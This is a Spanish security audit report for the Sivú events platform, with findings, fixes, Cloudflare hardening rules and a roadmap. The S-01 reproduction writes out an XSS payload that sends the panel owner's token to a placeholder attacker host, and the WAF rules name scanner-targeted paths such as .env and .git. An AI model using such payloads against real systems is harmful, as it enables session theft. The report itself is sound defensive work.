# Seguridad de Sivú — auditoría, cambios y configuración del borde

Auditoría autorizada de `heysivu.com`, `panel.heysivu.com` y `api.heysivu.com`
(Railway + Cloudflare), hecha sobre el código de la rama que está en
producción (`claude/beautiful-ride-z3p8ti`). Marco de referencia: OWASP WSTG
v4.2, OWASP API Security Top 10 2023 y OWASP Top 10 2021. Sin pruebas de
denegación de servicio ni fuerza bruta contra producción: todo lo que se
afirma aquí se reprodujo contra una copia local (API + Postgres + Chromium).

---

## 1. Resumen ejecutivo

**Riesgo global antes de los cambios: ALTO. Después: BAJO**, si además se
aplica la configuración de Cloudflare de la sección 4 (no requiere código).

Los tres riesgos más graves, en lenguaje de negocio:

1. **Cualquier persona podía tomar el control total de Sivú mandando un
   archivo por WhatsApp.** Un "documento" con formato de página web, abierto
   desde la bandeja del panel, se ejecutaba con la sesión del dueño: podía
   leer la base de clientes, cotizaciones, pagos e invitados, y cambiar
   cualquier evento. *Corregido.*
2. **Las fotos de todos los eventos se podían descargar en masa**, incluidos
   los que todavía no se publican, con solo ir cambiando un número en la
   dirección del archivo. *Corregido* (cada dirección lleva una firma).
3. **Quien tuviera acceso al panel podía publicar una página maliciosa en
   `api.heysivu.com`** (subiendo un "archivo" HTML) y los límites contra
   adivinar contraseñas y códigos se saltaban cambiando una cabecera.
   *Corregido.*

**Recomendación clave:** desplegar esta rama y, el mismo día, aplicar en
Cloudflare las reglas de la sección 4 (sobre todo: apagar Rocket Loader,
cabeceras del sitio y del panel, y las reglas de límite en login).

---

## 2. Tabla de hallazgos

| ID | Hallazgo | CVSS 3.1 | OWASP | Estado |
|---|---|---|---|---|
| S-01 | XSS almacenado en el panel vía archivos de WhatsApp (blob: con tipo `text/html`) → robo de sesión del dueño | **9.0** Crítica `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:L` | A03 Inyección / API8 | Corregido |
| S-02 | IDOR/BOLA en `GET /api/public/medio/{id}` (ids consecutivos, sin control) | **7.5** Alta `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | API1 BOLA | Corregido |
| S-03 | XSS almacenado en `api.heysivu.com`: subida de `data:text/html` / SVG servida con su tipo | **7.3** Alta `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N` | A03 / API8 | Corregido |
| S-04 | Límites de intentos evadibles con `X-Forwarded-For` falso (login, códigos, RSVP) | **7.5** Alta `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` | API2 / API4 | Corregido |
| S-05 | CORS acepta cualquier `*.up.railway.app` (de cualquier persona) | **5.3** Media | A05 Configuración | Corregido |
| S-06 | Sesión de 30 días sin revocación (logout solo borraba el token del navegador) | **6.5** Media | API2 / WSTG-SESS | Corregido |
| S-07 | `postMessage` sin validar origen: el panel guardaba posiciones ordenadas por cualquier ventana | **4.3** Media | WSTG-CLNT-11 | Corregido |
| S-08 | Cuerpo de 20 MB aceptado sin sesión en todas las rutas (incluido login) | **5.3** Media | API4 Consumo | Corregido |
| S-09 | Enumeración de códigos de invitado y tokens de cotización sin freno efectivo | **5.3** Media | API2 / API6 | Corregido |
| S-10 | Inyección CSS/HTML vía valores del tema en la exportación a PDF del panel | **4.6** Media | A03 | Corregido |
| S-11 | Sin CSP en sitio ni panel; sin cabeceras de seguridad en `heysivu.com` | **4.7** Media | A05 | Corregido en código + Cloudflare (sección 4) |
| S-12 | Códigos de invitado con `Math.random` (predecibles) | **3.7** Baja | A02 Criptografía | Corregido |
| S-13 | Secreto JWT por defecto en el código; algoritmo no fijado | **3.1** Baja | A02 / A07 | Corregido |
| S-14 | Enumeración de usuarios por tiempo de respuesta en login | **3.7** Baja | WSTG-IDNT-04 | Corregido |
| S-15 | Errores 500 por datos mal formados (ids no numéricos, fechas basura) | **3.1** Baja | WSTG-ERRH | Corregido |
| S-16 | Contraseñas de cliente de 6 caracteres; bcrypt costo 10 | **3.1** Baja | A07 | Corregido (10 / 12, costo 12) |
| S-17 | Banner del servidor y 404 de Express con HTML | Info | WSTG-INFO-02 | Corregido |
| S-18 | API legacy `invitacion-api-production.up.railway.app` | Info | API9 Inventario | Ya cerrada (Railway responde `x-railway-fallback`) |
| S-19 | Token del panel en `localStorage` | Info | WSTG-CLNT-12 | Aceptado con mitigaciones (ver 3.6) |

Revisado y **sin hallazgo**: inyección SQL (todas las consultas son
parametrizadas con `pg`; las pocas interpolaciones son fragmentos fijos del
código, no datos del usuario), SSRF (el servidor solo llama a
`graph.facebook.com` con rutas fijas; ahora con timeout), mass assignment
(cada `UPDATE` lista sus columnas a mano), autorización por función entre
dueño y cliente (`soloDueno` + `permisoCliente` funcionan), XSS en React
(no hay `dangerouslySetInnerHTML`; React 19 bloquea `javascript:` en `href`),
pagos (el servidor nunca confía en un importe del cliente: el "Ya pagué"
queda *por confirmar* hasta que el dueño lo revisa).

---

## 3. Detalle por hallazgo

### S-01 · Archivo de WhatsApp ejecutándose en el panel (Crítica)

- **Dónde:** `server/routes/bandeja.js` (`GET /api/admin/crm/bandeja/media/:id`)
  servía el archivo con el tipo que declaró quien lo mandó y `inline`. El
  panel lo baja como blob y, si es documento, lo abre con
  `<a href={blob:} target="_blank">`. Un `blob:` hereda el origen del panel.
- **Reproducción:** desde cualquier número, mandar al WhatsApp de Sivú un
  documento `factura.html` con `<script>fetch('https://atacante/?t='+localStorage.admin_token)</script>`.
  El dueño abre la bandeja → clic en el documento → el script corre en
  `panel.heysivu.com` y se lleva el token (acceso total por 30 días).
- **Corrección:** `server/archivos.js → enviarAdjunto()`: solo se respeta el
  tipo si es imagen, audio, video o PDF; cualquier otro se entrega como
  `application/octet-stream` + `attachment` + `CSP: sandbox`. Aplicado también
  a comprobantes de pago y archivos del formulario del cliente (`crm.js`). En
  el panel, `blobSeguro()` (api.js) hace lo mismo con lo que ya estuviera
  guardado. Prueba: el mismo archivo ahora se descarga, no se abre.

### S-02 · IDOR en `/api/public/medio/{id}` (Alta)

- **Antes:** `GET /api/public/medio/1`, `/2`, `/3`… devolvía cualquier foto o
  audio de cualquier evento, publicado o no.
- **Ahora:** las URLs las emite el servidor con una firma HMAC-SHA256
  (`/api/public/medio/57?f=…`, `archivos.js → urlMedio`). Sin firma válida →
  404, igual que si no existiera (no se distingue "no existe" de "no
  autorizado"). Las URLs no estaban guardadas en ningún contenido, así que no
  se rompe nada: el sitio y el panel las reciben ya firmadas.

### S-03 · Página maliciosa servida desde la API (Alta)

- **Antes:** `POST …/medios` con `datos: "data:text/html;base64,…"` se guardaba
  y `/medio/:id` lo servía como `text/html` en `api.heysivu.com`.
- **Ahora:** lista blanca por tipo (JPG, PNG, WEBP, GIF, AVIF; MP3, M4A, AAC,
  OGG, WAV, WEBM) **y** verificación de los primeros bytes (un HTML que dice
  ser PNG se rechaza). SVG fuera (puede llevar scripts). Todo archivo se
  sirve con `Content-Security-Policy: default-src 'none'; sandbox`; los
  antiguos de otro tipo se entregan como descarga binaria.

### S-04 · Límites evadibles (Alta)

- **Antes:** la IP salía de la primera entrada de `X-Forwarded-For`, que la
  escribe el cliente. Con un valor distinto por petición no había límite.
- **Ahora:** `clienteIp()` usa `X-Real-IP` (la pone el borde de Railway) y
  solo cree `CF-Connecting-IP` si la conexión viene de un rango oficial de
  Cloudflare. Además, el login se limita **por usuario** (5 fallos / 15 min,
  aunque cambien de IP: credential stuffing), los códigos de invitado por
  fallos (20 / 10 min) y los tokens de cotización/datos (15 fallos / 10 min).

### S-05 a S-17

| ID | Corrección (archivo) |
|---|---|
| S-05 | CORS cerrado a `heysivu.com`, `www`, `panel` + `CORS_ORIGINS`; localhost solo fuera de producción (`seguridad.js`) |
| S-06 | JWT HS256 fijado, 12 h, emisor fijo, `sesion_version` en la base: logout y cambio de contraseña invalidan todos los tokens (`auth.js`, `routes/auth.js`, migración 035, `clearToken()` del panel llama a `/api/auth/logout`) |
| S-07 | Panel: solo acepta mensajes del origen del sitio **y** de su propio iframe (`mensajeDelSitio`); sitio: solo de la ventana madre si es un panel conocido, y le responde solo a ese origen (`EditorContext.jsx`) |
| S-08 | JSON de 16 KB en `/api/public` y `/api/auth`; 20 MB solo en `/api/admin` **después** de validar la sesión; 15 MB para comprobantes/archivos del cliente solo si el token existe; timeouts de conexión (slowloris) y `statement_timeout` de 15 s en Postgres |
| S-09 | Freno por fallos en códigos y tokens; validación de formato antes de tocar la base |
| S-10 | Exportación PDF: los colores del tema solo se aceptan si son colores reales (`documento.js`); la API también valida colores y letras al guardarlos |
| S-11 | CSP sin scripts en línea para sitio y panel, generada en el build (`csp.config.js`); anti-clickjacking del panel movido a `public/antimarco.js` |
| S-12 | `crypto.randomInt` para los códigos |
| S-13 | En producción no arranca con el secreto de ejemplo; avisa si mide menos de 32 caracteres |
| S-14 | bcrypt se ejecuta siempre (hash de relleno) → mismo tiempo exista o no el usuario |
| S-15 | Parámetros validados (`router.param`), query string plana (`query parser: simple`), errores de formato de Postgres → 400 |
| S-16 | Mínimo 10 caracteres para clientes, 12 para el dueño; bcrypt 12 |
| S-17 | `GET /` → `{"ok":true}`; 404 JSON genérico; sin `X-Powered-By`, sin ETag |

Otros endurecimientos: rechazo de `__proto__`/`constructor` en cualquier
cuerpo JSON (prototype pollution), métodos HTTP permitidos por zona (405),
validación de tamaños y rangos en RSVP, secciones, ubicaciones y tema,
cabeceras de API (`CSP sandbox`, `HSTS preload`, `COOP`, `Permissions-Policy`,
`Cache-Control: no-store`), opción `SOLO_CLOUDFLARE=1`.

### 3.6 · Token en `localStorage` (aceptado)

Pasar a cookie `HttpOnly` exige que panel y API compartan sitio y cambiar
todo el flujo de autenticación (+ protección CSRF). Con lo de arriba el
riesgo residual es bajo: CSP del panel sin scripts en línea ni externos,
token de 12 h revocable, y el único XSS encontrado (S-01) cerrado. Queda en
el roadmap a 3 meses.

---

## 4. Configuración de Cloudflare (sin código)

Zona `heysivu.com`. Confirma primero en **DNS** que `@`, `www`, `panel` y
`api` están con la **nube naranja (Proxied)**.

### 4.1 SSL/TLS
- **SSL/TLS → Overview:** modo **Full (strict)**. Railway sirve certificado
  válido para los dominios propios, así que no rompe nada. (Flexible o Full
  aceptarían un origen sin certificado válido: tráfico interceptable entre
  Cloudflare y Railway.)
- **SSL/TLS → Edge Certificates:**
  - Minimum TLS Version: **TLS 1.2** · TLS 1.3: **On**
  - Always Use HTTPS: **On** · Automatic HTTPS Rewrites: **On**
  - HSTS: **Enable**, `max-age` 6 meses al principio (luego 12), Include
    subdomains **On**, Preload **On** solo cuando lleves un mes sin problemas
    (el preload es difícil de deshacer), No-Sniff **On**.
  - (Plan Pro+) Cipher suites → **Modern**.

### 4.2 Apagar lo que inyecta scripts en línea (rompería la CSP)
- **Speed → Optimization → Content Optimization:** **Rocket Loader: Off**.
- **Scrape Shield:** **Email Address Obfuscation: Off**.
- Zaraz: sin usar. Web Analytics puede seguir (ya está permitido en la CSP).

### 4.3 Cabeceras (Rules → Transform Rules → Modify Response Header)

**Regla "Cabeceras sitio"** · si: `(http.host in {"heysivu.com" "www.heysivu.com"})` · Set static:

| Cabecera | Valor |
|---|---|
| `Content-Security-Policy` | `frame-ancestors 'self' https://panel.heysivu.com` |
| `X-Content-Type-Options` | `nosniff` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=()` |
| `Cross-Origin-Opener-Policy` | `same-origin-allow-popups` |
| `Cross-Origin-Resource-Policy` | `same-site` |

(El resto de la CSP del sitio ya viaja en el `<meta>` del HTML; esta cabecera
añade solo `frame-ancestors`, que en `<meta>` no funciona. No pongas
`X-Frame-Options: DENY` en el sitio: el panel lo incrusta para el editor y la
landing incrusta sus propias plantillas.)

**Regla "Cabeceras panel"** · si: `(http.host eq "panel.heysivu.com")`:

| Cabecera | Valor |
|---|---|
| `Content-Security-Policy` | `frame-ancestors 'none'` |
| `X-Frame-Options` | `DENY` |
| `X-Content-Type-Options` | `nosniff` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` (no uses `no-referrer`: el sitio incrustado lo usa para reconocer al panel en Firefox) |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=()` |
| `Cross-Origin-Opener-Policy` | `same-origin` |
| `Cache-Control` | `no-store` |

La API (`api.heysivu.com`) ya manda todas sus cabeceras desde Express.

### 4.4 WAF → Managed rules
- Activa **Cloudflare Managed Ruleset** (todos los planes tienen el
  "Free Managed Ruleset"). En Pro+ activa también **OWASP Core Ruleset** con
  *Paranoia level* **PL1** y *score threshold* **Medium (40)** en modo **Log**
  una semana; si no hay falsos positivos (revisa Security → Events), pásalo a
  **Block**. Las rutas de subida (`/api/admin/`, `/api/public/cotizacion/`,
  `/api/public/datos/`) mandan base64 grande: si aparecen falsos positivos
  ahí, crea una excepción solo para esas rutas, nunca para toda la API.

### 4.5 WAF → Custom rules (en este orden)

1. **Métodos permitidos en la API pública** → *Block*
   ```
   (http.host eq "api.heysivu.com" and starts_with(http.request.uri.path, "/api/public/")
    and not http.request.method in {"GET" "HEAD" "POST" "DELETE" "OPTIONS"})
   ```
   (DELETE hace falta: el formulario del cliente borra sus archivos.)

2. **Nada fuera de las rutas conocidas** → *Block*
   ```
   (http.host eq "api.heysivu.com" and not starts_with(http.request.uri.path, "/api/")
    and not http.request.uri.path in {"/" "/salud"})
   ```

3. **Escáneres buscando archivos sensibles** → *Block* (todos los hosts)
   ```
   (http.request.uri.path contains "/.git" or http.request.uri.path contains "/.env"
    or http.request.uri.path contains "wp-admin" or http.request.uri.path contains "wp-login"
    or http.request.uri.path contains "phpmyadmin" or ends_with(http.request.uri.path, ".php"))
   ```

4. **Contraseña filtrada en el login** → *Block* (o *Log* la primera semana)
   ```
   (http.host eq "api.heysivu.com" and http.request.uri.path eq "/api/auth/login"
    and cf.waf.credential_check.password_leaked)
   ```
   Requiere **Security → Settings → Leaked credentials detection: On**. El
   panel manda `{"usuario": "...", "password": "..."}`; si tu plan permite
   *custom detection locations*, agrega una con usuario
   `lookup_json_string(http.request.body.raw, "usuario")` y contraseña
   `lookup_json_string(http.request.body.raw, "password")`. Si el campo nunca
   se activa en Security → Events, es que tu plan no lo detecta en ese
   formato: las reglas de límite de abajo y el límite por usuario del
   servidor siguen protegiendo.

5. (Opcional, recomendado) **Panel y API de administración solo desde
   Colombia** → *Managed Challenge* para `panel.heysivu.com`, *Block* para la API
   ```
   (http.host eq "panel.heysivu.com" and ip.src.country ne "CO")
   (http.host eq "api.heysivu.com" and (starts_with(http.request.uri.path, "/api/admin/")
    or starts_with(http.request.uri.path, "/api/auth/")) and ip.src.country ne "CO")
   ```
   No lo apliques a `/api/public/`: hay invitados en el exterior.

### 4.6 WAF → Rate limiting rules

| Regla | Expresión | Límite | Acción |
|---|---|---|---|
| Login | `(http.host eq "api.heysivu.com" and http.request.uri.path eq "/api/auth/login" and http.request.method eq "POST")` | 5 / 1 min por IP | Block 10 min |
| Archivos públicos | `(http.host eq "api.heysivu.com" and starts_with(http.request.uri.path, "/api/public/medio/"))` | 100 / 1 min por IP | Block 1 min |
| Confirmaciones | `(http.host eq "api.heysivu.com" and ends_with(http.request.uri.path, "/rsvp"))` | 10 / 1 min por IP | Block 10 min |
| Cotizaciones y datos | `(http.host eq "api.heysivu.com" and (starts_with(http.request.uri.path, "/api/public/cotizacion/") or starts_with(http.request.uri.path, "/api/public/datos/")))` | 30 / 1 min por IP | Block 10 min |

Sobre los 10/min pedidos para `/medio/*`: una invitación con galería pide
20–40 archivos al abrirse, así que 10/min rompería la invitación a los
invitados. Con las URLs firmadas ya no hay enumeración que frenar; 100/min
corta el abuso sin afectar a nadie. El plan Free permite una sola regla de
límite y con ventana fija de 10 segundos: úsala para el **Login** con
"3 peticiones / 10 s por IP". El servidor ya aplica además 10 intentos por IP
y 5 fallos por usuario cada 15 minutos.

### 4.7 Caché de archivos (Rules → Cache Rules)
`(http.host eq "api.heysivu.com" and (starts_with(http.request.uri.path, "/api/public/medio/") or http.request.uri.path contains "/decoracion/"))`
→ *Eligible for cache*, Edge TTL: *respetar el origen* (ya mandan
`immutable`, 1 año). Incluye la query string en la clave (la firma `?f=`
y el `?v=` de las decoraciones forman parte del archivo).

### 4.8 Bots
- **Plan Free:** *Bot Fight Mode* **no** se puede saltar con reglas: bloquearía
  a UptimeRobot y podría frenar llamadas legítimas a la API. Déjalo
  **apagado**; las reglas de límite y los límites del servidor cubren lo mismo.
- **Plan Pro+ (Super Bot Fight Mode):** *Definitely automated* → Block,
  *Verified bots* → **Allow** (incluye el rastreador de WhatsApp que arma la
  vista previa de los enlaces). Excepción para UptimeRobot: crea una *IP List*
  `uptimerobot` con sus IPs publicadas
  (https://uptimerobot.com/help/locations/) y una custom rule *Skip → Super
  Bot Fight Mode* con
  `(ip.src in $uptimerobot and http.user_agent contains "UptimeRobot")`.
  El User-Agent solo no basta: cualquiera puede escribirlo.

---

## 5. Railway (variables)

| Servicio | Variable | Valor |
|---|---|---|
| invitacion-api | `JWT_SECRET` | 48+ caracteres aleatorios (`openssl rand -base64 48`). Cambiarlo cierra todas las sesiones. |
| invitacion-api | `CORS_ORIGINS` | Solo orígenes extra, p. ej. `https://panel-pruebas-production.up.railway.app` si ese panel usa esta API |
| invitacion-api | `SOLO_CLOUDFLARE` | `1` cuando confirmes que `api.heysivu.com` está *Proxied* (si no, la API rechaza todo) |
| sivú (sitio) | `VITE_PANEL_ORIGINS` | Solo si un panel distinto de `panel.heysivu.com` usa el editor visual |

Al desplegar: todos tienen que **volver a iniciar sesión una vez** (el token
nuevo es de 12 h y revocable). La migración `035_sesion_version.sql` corre
sola en el `preDeployCommand`.

---

## 6. Roadmap de remediación

| Plazo | Qué | Esfuerzo |
|---|---|---|
| **Esta semana** | Desplegar esta rama · Rocket Loader y Email Obfuscation Off · Transform Rules de cabeceras · regla de límite de login · SSL Full (strict) + TLS 1.2 · revisar que `JWT_SECRET` mida 32+ caracteres | 1–2 h |
| **1 mes** | Custom rules 1–5 · Managed rules en Log → Block · `SOLO_CLOUDFLARE=1` · HSTS a 12 meses + preload · `security.txt` en `public/.well-known/` · rotar contraseñas de clientes con menos de 10 caracteres | ½ día |
| **3 meses** | Sesión del panel en cookie `HttpOnly` + `SameSite=Strict` (panel y API bajo el mismo sitio) · 2FA para el dueño · limitador en Postgres/Redis si se pasa a más de una instancia · copia de seguridad cifrada y probada de la base · alertas de inicios de sesión fallidos | 2–4 días |

## 7. Cómo verificar
- `curl -sI https://api.heysivu.com/api/public/medio/1` → **404** (sin firma).
- `curl -sI https://heysivu.com/` → trae `content-security-policy: frame-ancestors …` (tras la Transform Rule).
- Panel → cerrar sesión → el token anterior responde **401**.
- Observatorio: https://developer.mozilla.org/es/observatory con los tres dominios.
